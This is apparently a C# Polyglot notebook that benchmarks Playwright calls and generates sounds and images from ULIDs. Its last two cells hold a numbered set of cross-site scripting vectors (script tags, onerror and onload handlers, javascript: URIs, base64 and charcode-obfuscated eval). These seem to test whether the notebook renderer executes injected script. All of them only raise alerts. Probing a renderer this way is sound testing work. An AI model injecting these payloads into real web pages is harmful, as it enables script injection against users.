{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    },
    "polyglot_notebook": {
     "kernelName": "csharp"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "#r \"nuget: BenchmarkDotNet, 0.13.9\"\n",
    "#r \"nuget: Microsoft.Playwright, 1.39.0\"\n",
    "#r \"nuget: NUlid, 1.7.1\"\n",
    "#r \"nuget: NAudio, 2.2.1\"\n",
    "#r \"nuget: SixLabors.ImageSharp, 3.0.2\"\n",
    "#r \"nuget: SixLabors.ImageSharp.Drawing, 2.0.0\"\n",
    "#r \"nuget: SixLabors.Fonts, 2.0.0\"\n",
    "#r \"bin/Release/net6.0/ConsoleBenchmark.dll\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    },
    "polyglot_notebook": {
     "kernelName": "csharp"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "NUlid.Ulid newUlid = NUlid.Ulid.NewUlid();\n",
    "Console.WriteLine(newUlid);\n",
    "\n",
    "int sampleRate = 44100;\n",
    "int seconds = 2;\n",
    "NAudio.Wave.WaveFormat waveFormat = new NAudio.Wave.WaveFormat(sampleRate, 1); // Mono sound\n",
    "var samples = new List<float>();\n",
    "\n",
    "for (int n = 0; n < sampleRate * seconds; n++)\n",
    "{\n",
    "    float sampleValue = 0;\n",
    "    for (int i = 0; i < newUlid.ToString().Length; i++)\n",
    "    {\n",
    "        char c = newUlid.ToString()[i];\n",
    "        int value = (int)c;\n",
    "\n",
    "        // Create a simple sinusoidal waveform based on the ULID\n",
    "        sampleValue += (float)Math.Sin((2 * Math.PI * value * n) / sampleRate);\n",
    "    }\n",
    "\n",
    "    samples.Add(sampleValue);\n",
    "}\n",
    "\n",
    "var waveProvider = new NAudio.Wave.BufferedWaveProvider(waveFormat);\n",
    "waveProvider.AddSamples(samples.SelectMany(v => BitConverter.GetBytes(v)).ToArray(), 0, samples.Count * 4); // 4 bytes per float\n",
    "\n",
    "// Use a MemoryStream to write the WAV data and then base64 encode it\n",
    "using (var memoryStream = new System.IO.MemoryStream())\n",
    "{\n",
    "    using (var waveFileWriter = new NAudio.Wave.WaveFileWriter(memoryStream, waveFormat))\n",
    "    {\n",
    "        byte[] bytes = new byte[waveProvider.BufferLength];\n",
    "        waveProvider.Read(bytes, 0, waveProvider.BufferLength);\n",
    "        waveFileWriter.Write(bytes, 0, bytes.Length);\n",
    "    }\n",
    "\n",
    "    byte[] audioData = memoryStream.ToArray();\n",
    "    string base64Audio = Convert.ToBase64String(audioData);\n",
    "    \n",
    "    // Display the audio element with the base64 encoded data\n",
    "    var audioTag = Microsoft.DotNet.Interactive.Formatting.PocketViewTags.video[controls: true, src: $\"data:audio/wav;base64,{base64Audio}\"]();\n",
    "    display(audioTag);\n",
    "}\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    },
    "polyglot_notebook": {
     "kernelName": "csharp"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "var stopWatch = new System.Diagnostics.Stopwatch();\n",
    "await using (ConsoleBenchmark.PlaywrightFixture fixture = await ConsoleBenchmark.PlaywrightFixture.CreateAsync()){\n",
    "    stopWatch.Start();\n",
    "    var jsonElement = await fixture.Expression1JsonElementEvaluateAsync();\n",
    "    stopWatch.Stop();\n",
    "}\n",
    "Console.WriteLine($\"{nameof(ConsoleBenchmark.PlaywrightFixture.Expression1JsonElementEvaluateAsync)}: {stopWatch.ElapsedMilliseconds}ms\");"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    },
    "polyglot_notebook": {
     "kernelName": "csharp"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "var stopWatch = new System.Diagnostics.Stopwatch();\n",
    "await using (var fixture = await ConsoleBenchmark.PlaywrightFixture.CreateAsync()){\n",
    "    stopWatch.Start();\n",
    "    var gameState = await fixture.Expression2StringDeserializeEvaluateAsync();\n",
    "    stopWatch.Stop();\n",
    "}\n",
    "Console.WriteLine($\"{nameof(ConsoleBenchmark.PlaywrightFixture.Expression2StringDeserializeEvaluateAsync)}: {stopWatch.ElapsedMilliseconds}ms\");"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    },
    "polyglot_notebook": {
     "kernelName": "csharp"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "var stopWatch = new System.Diagnostics.Stopwatch();\n",
    "await using (var fixture = await ConsoleBenchmark.PlaywrightFixture.CreateAsync()){\n",
    "    stopWatch.Start();\n",
    "    var screenshotBytes = await fixture.ScreenshotBytesAsync();\n",
    "    var base64str = Convert.ToBase64String(screenshotBytes);\n",
    "    stopWatch.Stop();\n",
    "    display(Microsoft.DotNet.Interactive.Formatting.PocketViewTags.img[src: \"data:image/png;base64,\" + base64str]);\n",
    "}\n",
    "Console.WriteLine($\"{nameof(ConsoleBenchmark.PlaywrightFixture.ScreenshotBytesAsync)}: {stopWatch.ElapsedMilliseconds}ms\");"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    },
    "polyglot_notebook": {
     "kernelName": "csharp"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "var stopWatch = new System.Diagnostics.Stopwatch();\n",
    "\n",
    "await using (var fixture = await ConsoleBenchmark.PlaywrightFixture.CreateAsync()){\n",
    "    stopWatch.Start();\n",
    "    var screenshotBytes = await fixture.QuerySelectorAsyncScreenshotAsync();\n",
    "    var base64str = Convert.ToBase64String(screenshotBytes);\n",
    "    stopWatch.Stop();\n",
    "    display(Microsoft.DotNet.Interactive.Formatting.PocketViewTags.img[src: \"data:image/png;base64,\" + base64str]);\n",
    "}\n",
    "Console.WriteLine($\"{nameof(ConsoleBenchmark.PlaywrightFixture.QuerySelectorAsyncScreenshotAsync)}: {stopWatch.ElapsedMilliseconds}ms\");"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    },
    "polyglot_notebook": {
     "kernelName": "csharp"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "var stopWatch = new System.Diagnostics.Stopwatch();\n",
    "await using (var fixture = await ConsoleBenchmark.PlaywrightFixture.CreateAsync()){\n",
    "    stopWatch.Start();\n",
    "    var path = await fixture.ScreenshotSaveAsync();\n",
    "    stopWatch.Stop();\n",
    "    var screenshotBytes = await System.IO.File.ReadAllBytesAsync(path);\n",
    "    var base64str = Convert.ToBase64String(screenshotBytes);\n",
    "    display(path.Replace(System.IO.Directory.GetCurrentDirectory(), \".\"));\n",
    "    display(Microsoft.DotNet.Interactive.Formatting.PocketViewTags.img[src: \"data:image/png;base64,\" + base64str]);\n",
    "}\n",
    "Console.WriteLine($\"{nameof(ConsoleBenchmark.PlaywrightFixture.ScreenshotSaveAsync)}: {stopWatch.ElapsedMilliseconds}ms\");"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    },
    "polyglot_notebook": {
     "kernelName": "csharp"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "NUlid.Ulid newUlid = NUlid.Ulid.NewUlid();\n",
    "Console.WriteLine(newUlid);"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    },
    "polyglot_notebook": {
     "kernelName": "csharp"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "System.Drawing.Bitmap b = new System.Drawing.Bitmap(50, 50);\n",
    "System.Drawing.Graphics g = System.Drawing.Graphics.FromImage(b);\n",
    "\n",
    "void d()\n",
    "{\n",
    "    using (System.IO.MemoryStream memStream = new System.IO.MemoryStream()) {\n",
    "        b.Save(memStream, System.Drawing.Imaging.ImageFormat.Png);\n",
    "        string base64str = Convert.ToBase64String(memStream.ToArray());\n",
    "        display(Microsoft.DotNet.Interactive.Formatting.PocketViewTags.img[src: \"data:image/png;base64,\" + base64str]);\n",
    "    };\n",
    "}\n",
    "\n",
    "g.Clear(System.Drawing.Color.White);\n",
    "g.DrawLine(System.Drawing.Pens.Black, 0, 0, b.Width, b.Height);\n",
    "d();\n",
    "\n",
    "g.Clear(System.Drawing.Color.Black);\n",
    "g.DrawRectangle(System.Drawing.Pens.Blue, 5, 5, b.Width-10, b.Height-10);\n",
    "d();"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    },
    "polyglot_notebook": {
     "kernelName": "csharp"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "display(Microsoft.DotNet.Interactive.Formatting.PocketViewTags.iframe[src: \"https://www.youtube.com/embed/-1pVLJl_snc?si=b72ci--nGXhEGYy8&amp;start=163;\", width: 560, height: 315]);\n",
    "display(Microsoft.DotNet.Interactive.Formatting.PocketViewTags.iframe[src: \"http://www.youtube.com/embed/-1pVLJl_snc?si=b72ci--nGXhEGYy8&amp;start=163;\", width: 560, height: 315]);\n",
    "display(Microsoft.DotNet.Interactive.Formatting.PocketViewTags.iframe[src: \"https://www.youtube.com/embed/-1pVLJl_snc?si=b72ci--nGXhEGYy8&amp;start=163&amp;autoplay=1&amp;loop=1;\", width: 560, height: 315]);\n",
    "display(Microsoft.DotNet.Interactive.Formatting.PocketViewTags.iframe[src: \"http://www.youtube.com/embed/-1pVLJl_snc?si=b72ci--nGXhEGYy8&amp;start=163&amp;autoplay=1&amp;loop=1;\", width: 560, height: 315]);\n",
    "display(Microsoft.DotNet.Interactive.Formatting.PocketViewTags.iframe[src: \"https://looptube.io/?videoId=-1pVLJl_snc&start=165&end=188&rate=1\", width: 560, height: 315]);"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    },
    "polyglot_notebook": {
     "kernelName": "csharp"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "var stopWatch = new System.Diagnostics.Stopwatch();\n",
    "await using (var fixture = await ConsoleBenchmark.PlaywrightFixture.CreateAsync()){\n",
    "    stopWatch.Start();\n",
    "    var path = await fixture.ScreenshotSaveAsync();\n",
    "    stopWatch.Stop();\n",
    "    display(Microsoft.DotNet.Interactive.Formatting.PocketViewTags.img[src: path.Replace(System.IO.Directory.GetCurrentDirectory(), \".\")]);\n",
    "}\n",
    "Console.WriteLine($\"{nameof(ConsoleBenchmark.PlaywrightFixture.ScreenshotSaveAsync)}: {stopWatch.ElapsedMilliseconds}ms\");"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    },
    "polyglot_notebook": {
     "kernelName": "csharp"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "System.Drawing.Bitmap b = new System.Drawing.Bitmap(200, 200);\n",
    "System.Drawing.Graphics g = System.Drawing.Graphics.FromImage(b);\n",
    "NUlid.Ulid newUlid = NUlid.Ulid.NewUlid();\n",
    "Console.WriteLine(newUlid);\n",
    "// Clear canvas\n",
    "g.Clear(System.Drawing.Color.White);\n",
    "\n",
    "// Start drawing based on the ULID\n",
    "for (int i = 0; i < newUlid.ToString().Length; i++)\n",
    "{\n",
    "    char c = newUlid.ToString()[i];\n",
    "    int value = (int)c;\n",
    "\n",
    "    // Use value to set color\n",
    "    System.Drawing.Color color = System.Drawing.Color.FromArgb(value * 10 % 255, value * 5 % 255, value * 15 % 255);\n",
    "    using System.Drawing.Pen pen = new System.Drawing.Pen(color, 2);\n",
    "\n",
    "    // Draw some graphics\n",
    "    g.DrawEllipse(pen, value % b.Width, (value * 2) % b.Height, value % 50, value % 50);\n",
    "    g.DrawLine(pen, i * 15, value % b.Height, b.Width - i * 15, (value * 2) % b.Height);\n",
    "}\n",
    "\n",
    "using (System.IO.MemoryStream memStream = new System.IO.MemoryStream()){\n",
    "    b.Save(memStream, System.Drawing.Imaging.ImageFormat.Png);\n",
    "    string base64str = Convert.ToBase64String(memStream.ToArray());\n",
    "    display(Microsoft.DotNet.Interactive.Formatting.PocketViewTags.img[src: \"data:image/png;base64,\" + base64str]);\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    },
    "polyglot_notebook": {
     "kernelName": "csharp"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "using SixLabors.ImageSharp.Processing;\n",
    "using SixLabors.ImageSharp.Drawing.Processing;\n",
    "\n",
    "// Parameters\n",
    "int width = 100;\n",
    "int height = 100;\n",
    "int numberOfFrames = 10;\n",
    "int circleDiameter = 20;\n",
    "\n",
    "// Create individual frames\n",
    "SixLabors.ImageSharp.Image<SixLabors.ImageSharp.PixelFormats.Rgba32>[] frames = new SixLabors.ImageSharp.Image<SixLabors.ImageSharp.PixelFormats.Rgba32>[numberOfFrames];\n",
    "\n",
    "for (int i = 0; i < numberOfFrames; i++)\n",
    "{\n",
    "    var image = new SixLabors.ImageSharp.Image<SixLabors.ImageSharp.PixelFormats.Rgba32>(width, height);\n",
    "    int positionX = i * (width - circleDiameter) / (numberOfFrames - 1);\n",
    "\n",
    "    image.Mutate(ctx => ctx.Fill(SixLabors.ImageSharp.PixelFormats.Rgba32.ParseHex(\"#333333\"))  // Background color\n",
    "                        .Fill(SixLabors.ImageSharp.PixelFormats.Rgba32.ParseHex(\"#df3079\"), new SixLabors.ImageSharp.Drawing.EllipsePolygon(positionX + circleDiameter / 2, height / 2, circleDiameter / 2)));  // Moving circle\n",
    "    \n",
    "    frames[i] = image;\n",
    "}\n",
    "\n",
    "// Create the GIF\n",
    "var outputImage = new SixLabors.ImageSharp.Image<SixLabors.ImageSharp.PixelFormats.Rgba32>(width, height);\n",
    "for (int i = 0; i < numberOfFrames; i++)\n",
    "{\n",
    "    outputImage.Frames.AddFrame(frames[i].Frames.RootFrame);\n",
    "    outputImage.Frames[i].Metadata.GetFormatMetadata(SixLabors.ImageSharp.Formats.Gif.GifFormat.Instance).FrameDelay = 100;  // 100ms delay = 10fps\n",
    "}\n",
    "\n",
    "// Convert to base64 for inlining\n",
    "using (var ms = new System.IO.MemoryStream()){    \n",
    "    outputImage.Metadata.GetFormatMetadata(SixLabors.ImageSharp.Formats.Gif.GifFormat.Instance).RepeatCount = 0;\n",
    "    outputImage.Save(ms, new SixLabors.ImageSharp.Formats.Gif.GifEncoder());\n",
    "    byte[] gifBytes = ms.ToArray();\n",
    "    string base64Gif = Convert.ToBase64String(gifBytes);\n",
    "    display(Microsoft.DotNet.Interactive.Formatting.PocketViewTags.img[src: $\"data:image/gif;base64,{base64Gif}\"]);\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    },
    "polyglot_notebook": {
     "kernelName": "csharp"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "using SixLabors.ImageSharp.Processing;\n",
    "using SixLabors.ImageSharp.Drawing.Processing;\n",
    "\n",
    "// Parameters\n",
    "int width = 100;\n",
    "int height = 100;\n",
    "int numberOfFrames = 26;  // Length of a ULID\n",
    "Dictionary<char, SixLabors.ImageSharp.PixelFormats.Rgba32> ulidColorMap = new Dictionary<char, SixLabors.ImageSharp.PixelFormats.Rgba32>\n",
    "{\n",
    "    // This is just a sample mapping. You can change colors as you see fit.\n",
    "    {'0', SixLabors.ImageSharp.PixelFormats.Rgba32.ParseHex(\"#df3079\")},\n",
    "    {'1', SixLabors.ImageSharp.PixelFormats.Rgba32.ParseHex(\"#2e95d3\")},\n",
    "    {'2', SixLabors.ImageSharp.PixelFormats.Rgba32.ParseHex(\"#00a67d\")},\n",
    "    //... Add other characters from ULID here with corresponding colors.\n",
    "};\n",
    "\n",
    "var ulidStr = NUlid.Ulid.NewUlid().ToString();\n",
    "\n",
    "// Create individual frames\n",
    "SixLabors.ImageSharp.Image<SixLabors.ImageSharp.PixelFormats.Rgba32>[] frames = new SixLabors.ImageSharp.Image<SixLabors.ImageSharp.PixelFormats.Rgba32>[numberOfFrames];\n",
    "\n",
    "for (int i = 0; i < numberOfFrames; i++)\n",
    "{\n",
    "    var image = new SixLabors.ImageSharp.Image<SixLabors.ImageSharp.PixelFormats.Rgba32>(width, height);\n",
    "    \n",
    "    if (i < ulidStr.Length && ulidColorMap.TryGetValue(ulidStr[i], out var color))\n",
    "    {\n",
    "        image.Mutate(ctx => ctx.Fill(color));  // Fill with color based on ULID's character\n",
    "    }\n",
    "    else\n",
    "    {\n",
    "        image.Mutate(ctx => ctx.Fill(SixLabors.ImageSharp.PixelFormats.Rgba32.ParseHex(\"#808080\")));  // Default color if ULID is shorter or character not mapped\n",
    "    }\n",
    "    frames[i] = image;\n",
    "}\n",
    "\n",
    "// Create the GIF\n",
    "var outputImage = new SixLabors.ImageSharp.Image<SixLabors.ImageSharp.PixelFormats.Rgba32>(width, height);\n",
    "for (int i = 0; i < numberOfFrames; i++)\n",
    "{\n",
    "    outputImage.Frames.AddFrame(frames[i].Frames.RootFrame);\n",
    "    outputImage.Frames[i].Metadata.GetFormatMetadata(SixLabors.ImageSharp.Formats.Gif.GifFormat.Instance).FrameDelay = 100;  // 100ms delay = 10fps\n",
    "}\n",
    "\n",
    "// Convert to base64 for inlining\n",
    "using (var ms = new System.IO.MemoryStream())\n",
    "{    \n",
    "    outputImage.Metadata.GetFormatMetadata(SixLabors.ImageSharp.Formats.Gif.GifFormat.Instance).RepeatCount = 0;\n",
    "    outputImage.Save(ms, new SixLabors.ImageSharp.Formats.Gif.GifEncoder());\n",
    "    byte[] gifBytes = ms.ToArray();\n",
    "    string base64Gif = Convert.ToBase64String(gifBytes);\n",
    "    display(Microsoft.DotNet.Interactive.Formatting.PocketViewTags.img[src: $\"data:image/gif;base64,{base64Gif}\"]);\n",
    "}\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    },
    "polyglot_notebook": {
     "kernelName": "csharp"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "using SixLabors.ImageSharp.Processing;\n",
    "using SixLabors.ImageSharp.Drawing.Processing;\n",
    "\n",
    "// Parameters\n",
    "int width = 200;\n",
    "int height = 200;\n",
    "int numberOfFrames = 11;\n",
    "float frequency = 2.0f * (float)Math.PI / width;\n",
    "float amplitude = 50;\n",
    "\n",
    "// Create individual frames\n",
    "var frames = new List<SixLabors.ImageSharp.Image<SixLabors.ImageSharp.PixelFormats.Rgba32>>();\n",
    "\n",
    "for (int t = 0; t < numberOfFrames; t++)\n",
    "{\n",
    "    var image = new SixLabors.ImageSharp.Image<SixLabors.ImageSharp.PixelFormats.Rgba32>(width, height);\n",
    "\n",
    "    // Load a font for text drawing. For this example, I'll use a default system font.\n",
    "    SixLabors.Fonts.FontCollection fontCollection = new SixLabors.Fonts.FontCollection();\n",
    "    SixLabors.Fonts.FontFamily fontFamily = SixLabors.Fonts.SystemFonts.Families.FirstOrDefault();\n",
    "    SixLabors.Fonts.Font font = fontFamily.CreateFont(18); // 18pt size\n",
    "\n",
    "    image.Mutate(ctx => \n",
    "    {\n",
    "        // make the background transparent\n",
    "        ctx.Fill(SixLabors.ImageSharp.PixelFormats.Rgba32.ParseHex(\"#00000000\"));\n",
    "\n",
    "        SixLabors.ImageSharp.PointF[] points = new SixLabors.ImageSharp.PointF[width];\n",
    "        for (int x = 0; x < width; x++)\n",
    "        {\n",
    "            int y = (int)(height / 2 + amplitude * Math.Sin(frequency * x + ((float)t/numberOfFrames) * 2.0f * Math.PI));\n",
    "            points[x] = new SixLabors.ImageSharp.PointF(x, y);\n",
    "        }\n",
    "        ctx.DrawPolygon(SixLabors.ImageSharp.PixelFormats.Rgba32.ParseHex(\"#ff6347\"), 2, points);\n",
    "\n",
    "        // Draw the frame number\n",
    "        ctx.DrawText(t.ToString(), font, SixLabors.ImageSharp.Color.White, new SixLabors.ImageSharp.PointF(width / 2, height / 2));\n",
    "    });\n",
    "\n",
    "    frames.Add(image);\n",
    "    // save Image from stream to a file using png image encoder\n",
    "    using (var fs = new System.IO.FileStream(System.IO.Path.Combine(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetAssembly(typeof(ConsoleBenchmark.PlaywrightFixture)).Location) ?? throw new NullReferenceException(), $\"{t}-\" + NUlid.Ulid.NewUlid().ToString() + ConsoleBenchmark.FixtureConstants.ScreenshotType.Png), System.IO.FileMode.Create, System.IO.FileAccess.Write))\n",
    "    {\n",
    "        \n",
    "        image.Save(fs, new SixLabors.ImageSharp.Formats.Png.PngEncoder());\n",
    "    }\n",
    "}\n",
    "\n",
    "// Create the GIF\n",
    "var outputImage = new SixLabors.ImageSharp.Image<SixLabors.ImageSharp.PixelFormats.Rgba32>(width, height);\n",
    "for (int i = 0; i < frames.Count; i++)\n",
    "{\n",
    "    outputImage.Frames.AddFrame(frames[i].Frames.RootFrame);\n",
    "    var frameMetadata = outputImage.Frames[i].Metadata.GetFormatMetadata(SixLabors.ImageSharp.Formats.Gif.GifFormat.Instance);\n",
    "    frameMetadata.FrameDelay = 100;  // 100ms delay = 10fps\n",
    "    frameMetadata.DisposalMethod = i == frames.Count-1 ? SixLabors.ImageSharp.Formats.Gif.GifDisposalMethod.NotDispose : SixLabors.ImageSharp.Formats.Gif.GifDisposalMethod.RestoreToBackground;\n",
    "}\n",
    "\n",
    "// Convert to base64 for inlining\n",
    "using (var ms = new System.IO.MemoryStream())\n",
    "{    \n",
    "    outputImage.Metadata.GetFormatMetadata(SixLabors.ImageSharp.Formats.Gif.GifFormat.Instance).RepeatCount = 0;\n",
    "    outputImage.Save(ms, new SixLabors.ImageSharp.Formats.Gif.GifEncoder());\n",
    "    byte[] gifBytes = ms.ToArray();\n",
    "    string base64Gif = Convert.ToBase64String(gifBytes);\n",
    "    display(Microsoft.DotNet.Interactive.Formatting.PocketViewTags.img[src: $\"data:image/gif;base64,{base64Gif}\"]);\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    },
    "polyglot_notebook": {
     "kernelName": "csharp"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "// vector 0\n",
    "display(\"<script>alert('<script>alert(\\'// vector 0\\')</script>')</script>\");\n",
    "// vector 1\n",
    "display(Microsoft.DotNet.Interactive.Formatting.PocketViewTags.img[src: \"nonexistent.gif\", onerror: \"console.error('// vector 1'); alert('// vector 1');\"]);\n",
    "// vector 2\n",
    "display(Microsoft.DotNet.Interactive.Formatting.PocketViewTags.script[value: \"<script>alert('<script>alert(\\'<script>alert(\\'<script>alert(\\'// vector 2\\');console.error(\\'// vector 2\\');</script>\\');</script>\\');</script>');</script>\"]);\n",
    "display(Microsoft.DotNet.Interactive.Formatting.PocketViewTags.script[\"alert('// vector 2');console.error('// vector 2');\"]);\n",
    "display(Microsoft.DotNet.Interactive.Formatting.PocketViewTags.script[\"alert(\\'// vector 2\\');console.error(\\'// vector 2\\');\"]);\n",
    "display(Microsoft.DotNet.Interactive.Formatting.PocketViewTags.script[\"<script>alert('<script>alert(\\'<script>alert(\\'<script>alert(\\'// vector 2\\');console.error(\\'// vector 2\\');</script>\\');</script>\\');</script>');</script>\"]);\n",
    "// vector 3\n",
    "display(Microsoft.DotNet.Interactive.Formatting.PocketViewTags.div[HTML(\"<svg onload='alert(\\\"// vector 3\\\");console.error(\\\"// vector 3\\\");'><rect width='100' height='100' style='fill:blue;'/></svg>\")]);\n",
    "// vector 4\n",
    "display(Microsoft.DotNet.Interactive.Formatting.PocketViewTags.a[href: \"javascript:alert('// vector 4');\", innerHTML: \"vector 4\"]);\n",
    "display(Microsoft.DotNet.Interactive.Formatting.PocketViewTags.a[href: \"javascript:console.error('// vector 4');\", innerHTML: \"vector 4\"]);\n",
    "// vector 5\n",
    "display(Microsoft.DotNet.Interactive.Formatting.PocketViewTags.script[$\"eval(atob('{Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(\"alert('// vector 5');console.error('// vector 5');\"))}'));\"]);\n",
    "display(Microsoft.DotNet.Interactive.Formatting.PocketViewTags.script[$\"<script>eval(atob('{Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(\"alert('// vector 5');console.error('// vector 5');\"))}'));</script>\"]);\n",
    "// vector 6\n",
    "display(Microsoft.DotNet.Interactive.Formatting.PocketViewTags.button[onclick: \"alert(\\\"alert('// vector 6');console.error('// vector 6');\\\");\", innerHTML: \"// vector 6\"]);\n",
    "display(Microsoft.DotNet.Interactive.Formatting.PocketViewTags.button[onclick: \"alert(\\\"alert('// vector 6');console.error('// vector 6');\\\");\", name: \"vector 6\"]);\n",
    "display(Microsoft.DotNet.Interactive.Formatting.PocketViewTags.button[onclick: \"alert(\\\"alert('// vector 6');console.error('// vector 6');\\\");\", value: \"vector 6\"]);\n",
    "// vector 7\n",
    "display(Microsoft.DotNet.Interactive.Formatting.PocketViewTags.div[HTML(\"<iframe src='javascript:alert(\\\"// vector 7\\\");'></iframe>\")]);\n",
    "display(Microsoft.DotNet.Interactive.Formatting.PocketViewTags.div[HTML(\"<iframe src='javascript:console.error(\\\"// vector 7\\\");'></iframe>\")]);\n",
    "display(Microsoft.DotNet.Interactive.Formatting.PocketViewTags.iframe[src: \"javascript:alert(\\\"// vector 7\\\");\", width: 560, height: 315]);\n",
    "display(Microsoft.DotNet.Interactive.Formatting.PocketViewTags.iframe[src: \"javascript:console.error(\\\"// vector 7\\\");\", width: 560, height: 315]);\n",
    "// vector 8\n",
    "display(Microsoft.DotNet.Interactive.Formatting.PocketViewTags.input[type: \"text\", onfocus: \"alert(\\\"alert('// vector 8');console.error('// vector 8');\\\");\", autofocus: \"true\", placeholder: \"// vector 8\"]);\n",
    "// vector 9\n",
    "display(Microsoft.DotNet.Interactive.Formatting.PocketViewTags.iframe[src: \"data:text/html;base64,PHNjcmlwdD5hbGVydCgnLy8gdmVjdG9yIDknKTtjb25zb2xlLmVycm9yKCcvLyB2ZWN0b3IgOScpOzwvc2NyaXB0Pgo=\"]);\n",
    "display(Microsoft.DotNet.Interactive.Formatting.PocketViewTags.iframe[src: \"data:text/html;base64,PHNjcmlwdD5hbGVydCgnLy8gdmVjdG9yIDknKTtjb25zb2xlLmVycm9yKCcvLyB2ZWN0b3IgOScpOzwvc2NyaXB0Pg==\"]);\n",
    "// vector 10\n",
    "display(Microsoft.DotNet.Interactive.Formatting.PocketViewTags.div[style: \"background-image: url('javascript:alert(\\\"// vector 10\\\")');\"]);\n",
    "display(Microsoft.DotNet.Interactive.Formatting.PocketViewTags.div[style: \"background-image: url('javascript:console.error(\\\"// vector 10\\\")');\"]);\n",
    "// vector 11\n",
    "display(Microsoft.DotNet.Interactive.Formatting.PocketViewTags.img[src: \"data:image/svg+xml;base64,\" + Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(\"<svg onload='alert(\\\"// vector 11\\\");console.error(\\\"// vector 11\\\");'><rect width='100' height='100' style='fill:blue;'/></svg>\"))]);\n",
    "// vector 12\n",
    "display(Microsoft.DotNet.Interactive.Formatting.PocketViewTags.img[src: \"data:image/svg+xml;base64,\" + Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(\"<svg xmlns='http://www.w3.org/2000/svg' onload='alert(\\\"// vector 12\\\");console.error(\\\"// vector 12\\\");'><rect width='100' height='100' style='fill:blue;'/></svg>\"))]);\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    },
    "polyglot_notebook": {
     "kernelName": "csharp"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
    "display(HTML(\"<button onmouseover='alert(\\\"vector x1\\\");'>Hover Over Me</button>\"));\n",
    "\n",
    "display(HTML(\"<a href='javascript:alert(\\\"vector x2\\\");'>Click Me</a>\"));\n",
    "\n",
    "display(HTML(\"<div style='height:50px; :hover{content:\\\"vector x3\\\";}'>Hover over this div</div>\"));\n",
    "\n",
    "var svg_content = \"<svg xmlns='http://www.w3.org/2000/svg'><script>alert(\\\"vector x4\\\")</script></svg>\";\n",
    "display(HTML(svg_content));\n",
    "\n",
    "display(HTML(\"<script>eval(String.fromCharCode(97,108,101,114,116,40,39,118,101,99,116,111,114,32,120,54,39,41))</script>\"));\n",
    "\n",
    "display(HTML(\"<div contenteditable='true' onfocus='document.execCommand(\\\"insertHTML\\\", false, \\\"<script>alert('vector x1')</script>\\\")'>Click and type here</div>\"));\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    },
    "polyglot_notebook": {
     "kernelName": "csharp"
    },
    "vscode": {
     "languageId": "polyglot-notebook"
    }
   },
   "outputs": [],
   "source": [
